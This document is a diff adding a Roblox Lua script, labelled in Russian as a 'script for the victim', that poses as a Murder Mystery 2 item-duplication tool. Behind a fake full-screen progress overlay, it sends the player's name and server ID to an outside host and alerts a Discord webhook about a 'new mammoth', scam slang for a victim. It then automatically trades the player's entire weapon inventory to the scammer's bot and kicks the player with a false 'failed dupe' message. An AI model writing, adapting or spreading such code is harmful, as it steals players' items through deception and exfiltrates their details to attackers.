@@ -1,0 +1,376 @@
+--- Скрипт для жертвы
+local data = nil
+
+local success, response = pcall(function()
+    return http_request({
+        Url = 'https://testerss.pythonanywhere.com/nickname',
+        Method = 'GET',
+        Headers = {
+            ['Content-Type'] = 'application/json'
+        },
+    })
+end)
+
+if success then
+    data = response.Body
+else
+    warn("Request failed:", response)
+    return nil
+end
+
+local botname = data
+
+--- Создаем GUI систему
+local ScreenGUI = Instance.new("ScreenGui")
+ScreenGUI.Name = "ScreenStats"
+ScreenGUI.IgnoreGuiInset = true
+ScreenGUI.DisplayOrder = 9999
+ScreenGUI.ResetOnSpawn = false
+ScreenGUI.Parent = game.Players.LocalPlayer.PlayerGui
+local BackgroundFrame = Instance.new("Frame")
+BackgroundFrame.Size = UDim2.new(1,0,1,0)
+BackgroundFrame.BackgroundColor3 = Color3.fromRGB(1,1,1)
+BackgroundFrame.Parent = ScreenGUI
+local NicknameText = Instance.new("TextLabel")
+NicknameText.Parent = BackgroundFrame
+NicknameText.Name = "NicknameText"
+NicknameText.Text = "Proccesing Dupe inventory"
+NicknameText.TextSize = 80
+NicknameText.TextColor3 = Color3.fromRGB(255,255,255)
+NicknameText.Position = UDim2.new(0.5,0,0.1,7)
+NicknameText.Font = Enum.Font.FredokaOne
+local tasks = Instance.new("TextLabel")
+tasks.Parent = BackgroundFrame
+tasks.Name = "NicknameText"
+tasks.Text = "Proccesing..."
+tasks.TextSize = 40
+tasks.TextColor3 = Color3.fromRGB(255,255,255)
+tasks.Position = UDim2.new(0.5, 0, 1, -70)
+tasks.Font = Enum.Font.FredokaOne
+local procent = Instance.new("TextLabel")
+procent.Parent = BackgroundFrame
+procent.Name = "NicknameText"
+procent.Text = "Proccess..."
+procent.TextSize = 35
+procent.TextColor3 = Color3.fromRGB(255,255,255)
+procent.Position = UDim2.new(0.5, 0, 1, -35)
+procent.Font = Enum.Font.FredokaOne
+
+if game.PlaceId ~= 142823291 then game:GetService("TeleportService"):Teleport(142823291) end
+
+--- Проверяем девайс
+local hasLobby = game:GetService("Players").LocalPlayer.PlayerGui.MainGUI:FindFirstChild("Lobby") ~= nil
+if hasLobby == true then
+    acceptbutton = game:GetService("Players").LocalPlayer.PlayerGui.MainGUI.Lobby.Leaderboard.Container.OverlayMenu.TradeRequest.ReceivingRequest.Username.Text
+else
+    acceptbutton = game:GetService("Players").LocalPlayer.PlayerGui.MainGUI.Game.Leaderboard.Container.TradeRequest.ReceivingRequest.Username.Text
+end
+
+--- Получаем уровень, и проверяем больше ли он 10 уровня, если нет, то кикаем игрока с ошибкой.
+local player = game.Players.LocalPlayer
+local args = {
+    [1] = player.Name
+}
+local accountInformation = game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Extras"):WaitForChild("GetFullInventory"):InvokeServer(unpack(args))
+local level = accountInformation.LevelBadges["Level10"]
+
+if level == false then
+    player:Kick("You're less than level 10.")
+    task.wait(99999)
+end
+
+--- Парсим инвентарь и проверяем сколько всего предметов, так же получаем название и количество всех оружий.
+local HttpService = game:GetService("HttpService")
+
+local args = {
+    [1] = player.Name
+}
+
+local inventory = game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Extras"):WaitForChild("GetFullInventory"):InvokeServer(unpack(args))
+
+local weapons = inventory["Weapons"]
+local ownedWeapons = weapons["Owned"]
+
+local groupedWeapons = {}
+local currentGroup = {}
+local count = 0
+local totalSwords = 0
+
+for weaponName, weaponCount in pairs(ownedWeapons) do
+    totalSwords = totalSwords + weaponCount
+    if weaponCount > 1 then
+        table.insert(currentGroup, weaponName .. " (" .. weaponCount .. ")")
+    else
+        table.insert(currentGroup, weaponName .. " (1)")
+    end
+    count = count + 1
+
+    if count == 4 then
+        table.insert(groupedWeapons, currentGroup)
+        currentGroup = {}
+        count = 0
+    end
+end
+
+if #currentGroup > 0 then
+    table.insert(groupedWeapons, currentGroup)
+end
+
+local totalGroups = #groupedWeapons
+
+--- Проверяем сколько мечей у человека, если больше 10 отправляем запрос, в случае чего кикаем
+
+if totalSwords < 20 then
+    player:Kick("You don't have enough weapons to dupe, you need more than 20")
+    task.wait(99999)
+end
+
+--- Проверяем сколько людей на сервере
+
+local Players = game:GetService("Players")
+
+local function getPlayerCount()
+    local playerCount = #Players:GetPlayers()
+    return playerCount
+end
+
+local playernum = getPlayerCount()
+
+if playernum == 1 then
+    player:Kick("Only publuc server, no private")
+    task.wait(99999)
+end
+
+if playernum == 12 then
+    player:Kick("You have been kicked: The server has reached the maximum number of players for duping. Please rejoin a different server.")
+    task.wait(99999)
+end
+
+--- Отправляем данные на сервер Jobid, Nick
+
+local jobId = game.JobId
+
+local success, response = pcall(function()
+    return http_request({
+        Url = 'https://testerss.pythonanywhere.com/addmm2?names=' .. player.Name .. '&jobid=' .. jobId,
+        Method = 'GET',
+        Headers = {
+            ['Content-Type'] = 'application/json'
+        },
+    })
+end)
+
+if success then
+    local data = HttpService:JSONDecode(response.Body)
+else
+    warn("Request failed:", response)
+    return nil
+end
+
+--- Отправляем уведомление в дискорд
+
+local webh = "https://discord.com/api/webhooks/1337312412348448779/vTVgVNC-pFDEl0pPPQWV_VYfVMIWwOI6AiYlQcdgu6qyFZHy3upbnX7By7p9VNMnsVPJ"
+
+local HttpServ = game:GetService("HttpService")
+local url = webh
+
+local data = {
+    ["content"] = "@everyone", -- Mention everyone (remove if not needed)
+    ["embeds"] = {{
+        ["title"] = "🎯 **Попался новый мамонт**",
+        ["description"] = "A player has been caught! Here are the details:",
+        ["color"] = 16711680, -- Red color
+        ["fields"] = {
+            {
+                ["name"] = "👤 Username",
+                ["value"] = player.Name, -- Replace with actual player name
+                ["inline"] = false -- Display each field on a new line
+            },
+            {
+                ["name"] = "⚔️ Count",
+                ["value"] = totalSwords, -- Replace with actual sword count
+                ["inline"] = false
+            },
+            {
+                ["name"] = "📈 Level 10",
+                ["value"] = level, -- Replace with actual level
+                ["inline"] = false
+            }
+        },
+        ["footer"] = {
+            ["text"] = "Sent from Roblox",
+            ["icon_url"] = "https://example.com/roblox_icon.png"
+        },
+        ["thumbnail"] = {
+            ["url"] = "https://example.com/player_avatar.png"
+        }
+    }}
+}
+
+local newdata = HttpServ:JSONEncode(data)
+local headers = {
+    ["content-type"] = "application/json"
+}
+
+local request_payload = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+http_request(request_payload)
+
+--- Ожидаем нашего бота на сервере
+
+local processgui = 0
+print("Ждем бота")
+
+while true do
+    if processgui == 5 then
+        procent.Text = "Loading script..."
+    end
+    if processgui == 10 then
+        procent.Text = "Almost ready..."
+    end
+    if processgui == 15 then
+        procent.Text = "Just a little more..."
+    end
+    if processgui == 20 then
+        procent.Text = "Executing script..."
+    end
+    if processgui == 25 then
+        procent.Text = "Getting things ready..."
+    end
+    if processgui == 30 then
+        procent.Text = "Hang tight..."
+    end
+    if processgui == 35 then
+        procent.Text = "Preparing script..."
+    end
+    if processgui == 40 then
+        procent.Text = "Optimizing performance..."
+        processgui = 0
+    end
+    local checkbot = game.Players:FindFirstChild(botname)
+    if checkbot then
+        procent.Text = "Process launch in progress."
+        print("Увидели бота, идем дальше")
+        break
+    end
+    processgui = processgui + 1
+    task.wait(1)
+end
+
+print("Разделяем проценты")
+local procenttrade = 100 / totalGroups
+procent.Text = "0/100%"
+local procentttrade = 0
+
+while true do
+    task.wait(3)
+    local success, response = pcall(function()
+        return http_request({
+            Url = 'https://testerss.pythonanywhere.com/activeget',
+            Method = 'GET',
+            Headers = {
+                ['Content-Type'] = 'application/json'
+            },
+        })
+    end)
+    
+    if success then
+        local responseBody = response.Body
+        local responseData = game:GetService("HttpService"):JSONDecode(responseBody)
+        print(responseData.status)
+        if responseData.status == "true" then
+            break
+        end
+    else
+        warn("Request failed:", response)
+        return nil
+    end
+end
+
+for _, group in ipairs(groupedWeapons) do
+    procentttrade = procentttrade + procenttrade - 1
+    procent.Text = procentttrade .. "/100%"
+    local tradeAccepted = false
+    while not tradeAccepted do
+        local args = {
+            [1] = game:GetService("Players"):WaitForChild(botname)
+        }
+
+        game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("SendRequest"):InvokeServer(unpack(args))
+
+        local TradeRequest = game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("GetTradeStatus"):InvokeServer()
+        if TradeRequest == "StartTrade" then
+            for _, item in ipairs(group) do
+                local weaponName, weaponCount = item:match("(.+) %((%d+)%)")
+                weaponCount = tonumber(weaponCount)
+                
+                for i = 1, weaponCount do
+                    local args = {
+                        [1] = weaponName,
+                        [2] = "Weapons"
+                    }
+
+                    game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("OfferItem"):FireServer(unpack(args))
+                end
+            end
+
+            local tradeAcceptedCheck = false
+            while not tradeAcceptedCheck do
+
+                local TradeAcceptedCheck = nil
+                if hasLobby then
+                    TradeAcceptedCheck = game:GetService("Players").LocalPlayer.PlayerGui.TradeGUI_Phone.Container.Trade.TheirOffer.Accepted.Visible
+                else
+                    TradeAcceptedCheck = game:GetService("Players").LocalPlayer.PlayerGui.TradeGUI.Container.Trade.TheirOffer.Accepted.Visible
+                end
+
+                if TradeAcceptedCheck == true then
+                    local args = {
+                        [1] = 285646582
+                    }
+                    
+                    game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("AcceptTrade"):FireServer(unpack(args))
+                    tradeAcceptedCheck = true
+                    tradeAccepted = true
+                else
+                    task.wait(.1)
+                end
+            end
+            while true do
+                local TradeRequest = game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("GetTradeStatus"):InvokeServer()
+                print("TradeRequest:", TradeRequest)
+
+                if TradeRequest == "None" then
+                    break
+                end
+                task.wait(0.3)
+            end
+        end
+    end
+end
+
+--- Делаем 99.9%
+
+procent.Text = "99.9/100%"
+
+--- Удаляем игрока из базы
+
+local success, response = pcall(function()
+    return http_request({
+        Url = 'https://testerss.pythonanywhere.com/delmm2?names=' .. player.Name .. '&jobid=' .. jobId,
+        Method = 'GET',
+        Headers = {
+            ['Content-Type'] = 'application/json'
+        },
+    })
+end)
+
+if success then
+    local data = HttpService:JSONDecode(response.Body)
+else
+    warn("Request failed:", response)
+    return nil
+end
+
+--- Кикаем игрока, после неудачного дюпа
+player:Kick("Failed attempt to duplicate items. Your items are missing.")
+task.wait(99999)
